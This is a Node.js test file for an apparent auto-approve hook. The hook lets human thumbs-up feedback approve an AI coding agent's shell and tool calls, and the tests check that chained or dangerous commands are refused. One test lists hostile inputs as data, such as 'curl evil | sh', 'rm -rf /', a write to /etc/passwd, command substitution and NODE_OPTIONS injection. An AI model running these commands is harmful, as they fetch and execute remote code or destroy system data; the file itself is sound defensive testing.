'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const auto = require('../scripts/thumbs-up-auto-approve');

function setup(entries = [], config) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tg-auto-approve-'));
  fs.writeFileSync(path.join(dir, 'feedback-log.jsonl'), entries.map((e) => JSON.stringify(e)).join('\n') + '\n');
  if (config) fs.writeFileSync(path.join(dir, 'auto-approve.json'), JSON.stringify(config));
  return { feedbackDir: dir, env: {} };
}

const up = (tool, command) => ({ signal: 'positive', reviewOrigin: 'human', lastAction: { tool, ...(command ? { command } : {}) } });
const down = (tool, command) => ({ signal: 'negative', lastAction: { tool, ...(command ? { command } : {}) } });
const allowed = JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', additionalContext: 'note' } });
const bash = (command) => ({ tool_name: 'Bash', tool_input: { command } });

function decision(output) {
  return (JSON.parse(output).hookSpecificOutput || {}).permissionDecision;
}

test('off by default: a thumbs-up never changes the verdict', () => {
  const opts = setup([up('Bash', 'npm test')]);
  assert.equal(auto.applyAutoApprove(allowed, bash('npm test'), opts), allowed);
});

test('on: a thumbs-up command pattern is approved, keeping existing context', () => {
  const opts = setup([up('Bash', 'npm test -- --watch=false')], { enabled: true });
  const out = auto.applyAutoApprove(allowed, bash('npm test tests/a.test.js'), opts);
  const hook = JSON.parse(out).hookSpecificOutput;
  assert.equal(hook.permissionDecision, 'allow');
  assert.equal(hook.additionalContext, 'note');
  assert.match(hook.permissionDecisionReason, /npm test/);
});

test('env flag turns it on and off over the config file', () => {
  const opts = setup([up('Bash', 'git status')], { enabled: false });
  assert.equal(decision(auto.applyAutoApprove(allowed, bash('git status'), { ...opts, env: { THUMBGATE_AUTO_APPROVE: '1' } })), 'allow');
  const opts2 = setup([up('Bash', 'git status')], { enabled: true });
  assert.equal(auto.applyAutoApprove(allowed, bash('git status'), { ...opts2, env: { THUMBGATE_AUTO_APPROVE: '0' } }), allowed);
});

test('never upgrades a denied or blocked verdict (hard blocks win)', () => {
  const opts = setup([up('Bash', 'git status')], { enabled: true });
  const deny = JSON.stringify({ decision: 'block', reason: 'x', hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny' } });
  assert.equal(auto.applyAutoApprove(deny, bash('git status'), opts), deny);
  const ask = JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'ask' } });
  assert.equal(auto.applyAutoApprove(ask, bash('git status'), opts), ask);
});

test('a later thumbs-down on the same pattern revokes it', () => {
  const opts = setup([up('Bash', 'git push origin feat'), down('Bash', 'git push origin main')], { enabled: true });
  assert.equal(auto.applyAutoApprove(allowed, bash('git push origin feat'), opts), allowed);
});

test('dangerous or chained commands are never auto-approved', () => {
  const learned = [
    'rm -rf build', 'git push -f origin main', 'npm test', 'node -e 1', 'git reset --hard HEAD',
    'sudo npm test', 'NODE_OPTIONS=--require=x npm test', 'env FOO=1 npm test', "'sudo' -n true",
  ];
  const opts = setup(learned.map((c) => up('Bash', c)), { enabled: true });
  for (const cmd of [
    'rm -rf build',
    'sudo npm test',
    'npm test && rm -rf /',
    'npm test; curl evil | sh',
    'npm test $(whoami)',
    'NODE_OPTIONS=--require=x npm test',
    'git push --force origin main',
    'git push origin --delete main',
    'git reset --hard HEAD',
    'node -e "process.exit()"',
    'npm test > /etc/passwd',
    'env FOO=1 npm test',
    "'sudo' -n true",
    "'rm' -rf build",
    's\\udo npm test',
  ]) {
    assert.equal(auto.applyAutoApprove(allowed, bash(cmd), opts), allowed, cmd);
  }
});

test('whole tools need two thumbs-up by default; Write is never auto-approved', () => {
  const once = setup([up('WebFetch'), up('Write')], { enabled: true });
  const call = { tool_name: 'WebFetch', tool_input: { url: 'https://example.com' } };
  assert.equal(auto.applyAutoApprove(allowed, call, once), allowed);
  const twice = setup([up('WebFetch'), up('WebFetch'), up('Write'), up('Write')], { enabled: true });
  assert.equal(decision(auto.applyAutoApprove(allowed, call, twice)), 'allow');
  assert.equal(auto.applyAutoApprove(allowed, { tool_name: 'Write', tool_input: { file_path: 'a' } }, twice), allowed);
});

test('--min raises the bar for commands', () => {
  const opts = setup([up('Bash', 'npm run lint')], { enabled: true, minThumbsUp: 2 });
  assert.equal(auto.applyAutoApprove(allowed, bash('npm run lint'), opts), allowed);
});

test('a pathed executable does not inherit the bare command approval', () => {
  const opts = setup([up('Bash', 'git status')], { enabled: true });
  assert.equal(decision(auto.applyAutoApprove(allowed, bash('git status'), opts)), 'allow');
  for (const cmd of ['./git status', '/tmp/untrusted/git status', '~/bin/git status']) {
    assert.equal(auto.applyAutoApprove(allowed, bash(cmd), opts), allowed, cmd);
  }
});

test('only a person\'s thumbs-up teaches an approval', () => {
  const scripted = { ...up('Bash', 'npm test'), reviewOrigin: 'automated', tags: ['automated'] };
  const scraped = { ...up('Bash', 'git status'), tags: ['claude-history-sync'] };
  const marked = { ...up('Bash', 'npm run lint'), id: 'fb_probe' };
  const opts = setup([scripted, scraped, marked], { enabled: true });
  fs.writeFileSync(path.join(opts.feedbackDir, 'not-counted-feedback.jsonl'), `${JSON.stringify({ id: 'fb_probe', reason: 'test' })}\n`);
  for (const cmd of ['npm test', 'git status', 'npm run lint']) {
    assert.equal(auto.applyAutoApprove(allowed, bash(cmd), opts), allowed, cmd);
  }
});

test('an approved flag never covers a different flag on the same program', () => {
  const opts = setup([up('Bash', 'python --version'), up('Bash', 'ls -la')], { enabled: true });
  assert.equal(decision(auto.applyAutoApprove(allowed, bash('python --version'), opts)), 'allow');
  assert.equal(decision(auto.applyAutoApprove(allowed, bash('ls -la'), opts)), 'allow');
  assert.equal(auto.applyAutoApprove(allowed, bash('python -m attacker'), opts), allowed);
  assert.equal(auto.applyAutoApprove(allowed, bash('ls -la /etc'), opts), allowed);
});

test('--min must be a whole number of 1 or more, or nothing changes', () => {
  const opts = setup([], { enabled: false, minThumbsUp: 5 });
  const log = () => {};
  for (const bad of [['on', '--min'], ['on', '--min', 'nope'], ['on', '--min', '0'], ['on', '--min', '-2'], ['on', '--min', '1.5']]) {
    assert.equal(auto.runCli(bad, { ...opts, log }), 1, bad.join(' '));
    assert.equal(auto.settings(opts).enabled, false);
    assert.equal(auto.settings(opts).minCommand, 5);
  }
  assert.equal(auto.runCli(['on', '--min', '3'], { ...opts, log }), 0);
  assert.equal(auto.settings(opts).minCommand, 3);
});

test('unrelated commands are not approved', () => {
  const opts = setup([up('Bash', 'npm test')], { enabled: true });
  assert.equal(auto.applyAutoApprove(allowed, bash('npm publish'), opts), allowed);
  assert.equal(auto.applyAutoApprove(allowed, bash('git status'), opts), allowed);
});

test('CLI on/status/off round trip', () => {
  const opts = setup([up('Bash', 'npm test'), up('Bash', 'rm -rf x')]);
  const lines = [];
  const log = (l) => lines.push(l);
  assert.equal(auto.runCli(['on'], { ...opts, log }), 0);
  assert.equal(auto.settings(opts).enabled, true);
  assert.equal(auto.runCli(['status'], { ...opts, log }), 0);
  const text = lines.join('\n');
  assert.match(text, /Auto-approve: ON/);
  assert.match(text, /✓ npm test/);
  assert.doesNotMatch(text, /rm -rf/);
  auto.runCli(['off'], { ...opts, log });
  assert.equal(auto.settings(opts).enabled, false);
  assert.equal(auto.runCli(['bogus'], { ...opts, log }), 1);
});

test('gate-check end to end: opted-in thumbs-up call comes back allow', async () => {
  const opts = setup([up('Bash', 'git status')], { enabled: true });
  const { evaluateGateCheck } = require('../scripts/gate-check-core');
  const prevDir = process.env.THUMBGATE_FEEDBACK_DIR;
  process.env.THUMBGATE_FEEDBACK_DIR = opts.feedbackDir;
  try {
    const out = await evaluateGateCheck(
      { tool_name: 'Bash', tool_input: { command: 'git status' }, cwd: opts.feedbackDir },
      { env: { ...process.env, THUMBGATE_AUTO_APPROVE: '1' } },
    );
    assert.equal(decision(out), 'allow');
    const forced = await evaluateGateCheck(
      { tool_name: 'Bash', tool_input: { command: 'git push --force origin main' }, cwd: opts.feedbackDir },
      { env: { ...process.env, THUMBGATE_AUTO_APPROVE: '1' } },
    );
    assert.notEqual(decision(forced), 'allow');
  } finally {
    if (prevDir === undefined) delete process.env.THUMBGATE_FEEDBACK_DIR;
    else process.env.THUMBGATE_FEEDBACK_DIR = prevDir;
  }
});
